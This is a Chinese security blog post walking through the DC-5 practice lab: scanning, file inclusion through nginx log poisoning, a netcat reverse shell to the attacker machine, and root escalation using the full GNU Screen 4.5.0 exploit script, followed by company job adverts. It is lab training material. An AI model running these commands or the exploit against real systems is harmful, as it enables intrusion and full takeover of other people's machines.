> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/aXHEVeUSDN4pR9h2Tr3WoQ)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**No.1  
**_

_**搭建测试靶机**_

下载地址：https://www.five86.com/dc-5.html  
则靶机 DC-5 ip：192.168.188.158（NAT 连接）  
攻击机 kalilinux ip：192.168.188.144

_**No.2  
**_

_**信息收集**_

用 netdiscover -r 192.168.188.0/24 扫描 ip，得到靶机 ip 192.168.188.160

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WPictjCib0pmFzaDtSwHRuXvqtYIhwClupMmk5RU0SvdpsZWgTdLPIr0Q/640?wx_fmt=png)

先来端口扫描  
利用 nmap 对目标主机进行端口扫描，发现开放端口：80

```
使用命令：nmap -A -p- 192.168.188.160
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WN1bnibBL7qSt9AYK6ps8YggicETG971icE0HEArDpMvOLTXSib9TKkGMsg/640?wx_fmt=png)

扫描目录

```
命令：dirb http://192.168.188.160
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WpK1wNGOP1TS4GBtX1cXQwAeiajl4Jj5ibiamAqltFZeSIukVGr3qeGjQw/640?wx_fmt=png)

访问 DC-5 的 web 服务，只有一个提示，看不出什么特别来

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WbmlJic4NFbYaNbGX2rDKt3OOGs5uJjCDJsSkYicuLpfG6jyWDp3vBdkg/640?wx_fmt=png)

查看一下网站的页面功能后，点击打开 contact 页面的提交留言后，出现改变。  
发现 contact 页面在提交留言后，出现改变，年份刷新一次改变一次。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W4zicTtOwcU8g9aZdaTaicBZibQAJZqorXCG4waHyKia4on3RV9OJtOP6Fg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W6HXzEMB1R8yAicKyA8CJrvQrA90wXCcicYsrdGXqgMF08icQfMHhHycHA/640?wx_fmt=png)

直接访问 http://192.168.188.160/thinkyou.php 也是一样的界面

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WuicEA0P823b8fpEjSDFKOJ920NcK9UJ5gX46ngqLiafRjtFlIt9f0Etw/640?wx_fmt=png)

访问 http://192.168.188.160/footer.php

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W1JkDelz8Ph2ZbugM6An2A5QBVK8nR7pJo6KeicnxyIo0UJ5vQHUOHIg/640?wx_fmt=png)

_**No.3  
**_

_**漏洞利用**_

考虑存在文件包含  
服务器执行 PHP 文件时，可以通过文件包含函数加载另一个文件中的 PHP 代码，并且当 PHP 来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）  
该网站网页每刷新一次，年份都会发生变化，因此我们猜测 thinkyou.php 调用了 footer.php，于是想到了文件包含漏洞  
尝试 FUZZ 参数

```
root@kalilinux:~# wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://192.168.188.160/thankyou.php?FUZZ=/etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W8fz0htkjvBaW2eKOzLJyk8OCXobaYmsuSYLqTHOPIYJTZjx00TUleg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WjDQxpNEO61QUgrD1IOxFW6IXC0uz3I4KBsz9fxQw8WQ1M3WeRldS5Q/640?wx_fmt=png)

用 burp 抓包检测，可以看到的确存在该漏洞并且没有过滤包含进来的内容

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WDVyiaPntLl7wheqFWjHjdia4sUoMPCo7LCo2D4d9qBqWjbFWmsgqfHQA/640?wx_fmt=png)

将一句话木马写入到 php 的日志文件中，包含文件  
在前面的 nmap 扫描中，我们已经知道该 web 服务器使用的是 Nginx 服务，并且在网站上的每一步操作都将会被写入日志文件 log 内，因此我们可以通过 log 来拿 shell，写入 phpinfo（）进行探测，是否可以包含成功。  
将一句话木马通过 URL 写入到服务器上面，并且通过 burp 进行抓包。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WwJzuGzH3laGU8KKL24v7lLO4llcVItfibrq3MgbMo8AcUSKwiaBdSCpg/640?wx_fmt=png)

通过日志文件 log 查看是否写入成功。  
日志路径为：/var/log/nginx/access.log，是系统默认路径

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WDWibFX12Z7UJRF57ybm1awLf4iaNBS3PSm5as7M4swmgKpib5joHywu9Q/640?wx_fmt=png)

通过 firefox 浏览器打开访问 URL：http://192.168.188.160/thankyou.php?file=/var/log/nginx/access.log，发现一句话木马已经写入成功。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WKRa5gWoWSmAYg7VfBFEEMfOia3JHRAdTygiaHmQZDTYxoMGDsDCUta9A/640?wx_fmt=png)

使用 bp 抓包写入 PHP 的执行系统命令 （关于 passthru（）函数的快速描述 passthru - 执行外部程序并显示原始输出）

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W4HvnKdvMN2J8kcnmWllXdMibMEGric1uHcHLAl79SAzZ8ZF8LIwYsKhA/640?wx_fmt=png)

进行测试，看是否外部命令是否能够正常执行的；

```
命令：http://192.168.188.160/thankyou.php?file=/var/log/nginx/access.log&abc=cat%20/etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WqqPIfHq30xibJPYCR3cgyIHnic7vCgicALn8QMA3gQYOWOHA4NvAo0V1Q/640?wx_fmt=png)

反弹 shell  
通过 nc 命令直接进行 shell 反弹

```
abc=nc -e /bin/sh 192.168.188.144 7777
http://192.168.188.160/thankyou.php?file=/var/log/nginx/access.log&abc=nc -e /bin/sh 192.168.188.144 777
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9Wq4uXwn0FQic27Z6cGDLhib1RplfCWuAmCTnkZK6deqJdxTQ3C5t5j4pw/640?wx_fmt=png)

在 kali 上用命令：nc -lvvp 7777 对端口 7777 进行监听

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WboePDw2t4F0qicXW5Z9pKicKsNKufftrfNITibJh2m3YVyaCGJpRXDqFg/640?wx_fmt=png)

切换到交互模式 shell

```
交互式shell命令:python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WMNBzSOy4EfG9adhQfMVpazvmreZBEFZ73FgUFibkia9PiaXBJxNnsvSFg/640?wx_fmt=png)

  

查看具有特殊权限的二进制文件  
查找一下可以用 root 权限运行的命令；

```
命令：find / -perm -u=s -type f 2>/dev/null
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WeJibCVJibpVvjyZORvfSvGaA7WOZHQ036LD2b1Vxlny9vuyDJAwrPhCw/640?wx_fmt=png)

这里我们发现了一个 screen-4.5.0 的这个特殊文件  
在 kali 中使用 searchsploit 命令对 screen-4.5.0 漏洞进行搜索

```
root@kalilinux:~# searchsploit screen 4.5.0
---------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                          |  Path
                                                                                        | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------- ----------------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                           | exploits/linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                     | exploits/linux/local/41152.txt
---------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WelvBKCfmW8C0c2T6YwasznlHUV0SYqgUFyHupx6OZ9kht3pey73lDQ/640?wx_fmt=png)

我们直接利用

/usr/share/exploitdb/exploits/linux/local / 目录下的 41154.sh 文件  
将该 41154.sh 文件拷贝到 / root 目录下

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9Wdq00y9GciaPfgeNxHh6wMqTFxF35sNcOeY06zqx4uqt57Iu4HbfTBvw/640?wx_fmt=png)

将 41154.sh 文件上传到目标机 DC-5 上面  
kali 中当前路径开启 python.server，供 DC-5 下载

```
命令：python -m SimpleHTTPServer 9999
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WCpz307fE024bk13dbuKCdExowXlunlkmOG06Kw4QhL7XZMnHBbCADg/640?wx_fmt=png)

用 python 开启简单的服务器后，在以获得的 DC-5 的 getshell 下载 41154.sh 文件；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WFq1tcbQtZ5YVruXjggAKTd3yyFhxJe9BcgF3EuCmSicd811ObI6nCoQ/640?wx_fmt=png)

编译脚本

```
chmod +x 41154.sh
./41154.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WUn6c7ibK8uFjJLzvDDg2hiaIxlq7eN29w9XqyTL2Sr4RB0zXOUYtHfcQ/640?wx_fmt=png)

我们可以发现，脚本执行出现错误。  
重新在 kali 中打开 41154.sh 文件，研究一下 41154.sh 脚本代码

```
root@kalilinux:~# cat 41154.sh
# !/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
# include <stdio.h>
# include <sys/types.h>
# include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
# include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
[plain]
:set ff=unix
root@kalilinux:~#
```

通过以上分析，我们应该对以上代码分三步走  
第一步：把该 bash 文件的上面一部分 c 语言代码单独复制出来，如图

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WkJdz4P1IzAFVAdTnyy1O58c8N8Rw7XukHHQlYTQribrchKQOhyBemAA/640?wx_fmt=png)

libhax.c 进行编译，编译完成后将 libhax.c 文件删除；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W0Nkic74hcUTr08AY5TzicvCRl8lOWibeocsWOTR81GjdVQaq0Ms8FXhPA/640?wx_fmt=png)

第二步：把下面一个 c 语言代码也单独复制出来取文件名为 rootshell.c，然后进行编译操作

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WOyeoIXCeOj6tzB2Biapoo6gciaK377tOibhvdv8SxKl6MGJoEy0p6Z3Kg/640?wx_fmt=png)

对 rootshell.c 文件进行 gcc 编译后，将原文件 rootshell.c 删除掉；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WCnSIS7Hdw2T2uVfD9uE8j1J04s9h1aXag2zpUHiba1WL5ib8yaRAqX8Q/640?wx_fmt=png)

第三步：修改原来 41154.sh 的 bash 文件，如下图所示

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WvvKH9OhUia3WqI6xhvbicp6r529K15c63VOhgrRfvvrF2ibxVqY37NFDw/640?wx_fmt=png)

第四步：通过 vi 编译器打开已经编译好的 41154.sh 文件，并使用 :set ff=unix 进行保存  
编译后对 41154.sh 进行更名为 dc5.sh

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W0pLE0YKXsaiarHs0RfNI04BH6TEVMXQRAIEHwop3oAleuAf5x2dic7icg/640?wx_fmt=png)

最后把编译好的两个文件（libhax.so 和 rootshell）和 41154.sh 文件全部都上传到 DC-5 靶机上面

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9W0t0nKw1nVicXUicdytg8BVodoEc6ibBl63gMPSc4FJ1vkXpAySafJcU1g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WB2t6Aw6s9fDzicpYPyw56U6HDQycbgqiarUS3WXfia5wwKqZMe83h1Utg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WUvCKjyMyNWFMhDaqlMq8KwPhj5a5BsVsnib0ic3glSTabibaCwGCeBQSA/640?wx_fmt=png)

提权  
给 dc5.sh 文件赋予执行权，并且运行 dc5.sh，提权成功

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WfMwrZaO3IdT9SWutwIicfJ908oFGqicSXbrXvqD0gb5Q16B6sBMV4icZQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVom5fwmc6481zCkHKFfT9WTylXWa661X9YUJbuAd0RaGmvDsad4UI4af4ialYbeOe4gCz92qR462A/640?wx_fmt=png)

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVom5fwmc6481zCkHKFfT9Wz0fL1lbUKUFnvnpSiawA22aNTBBiaDHaCJdoYMI2yBgflw1TWeb8wGHA/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWCrcXsRRuMSFwRYoT70wZ4g1l4RiaDbiaW0AmzxpeucYTk1IicghqiaHxq1Zf8suibZWWtBUyNqUvnaUw/640?wx_fmt=jpeg)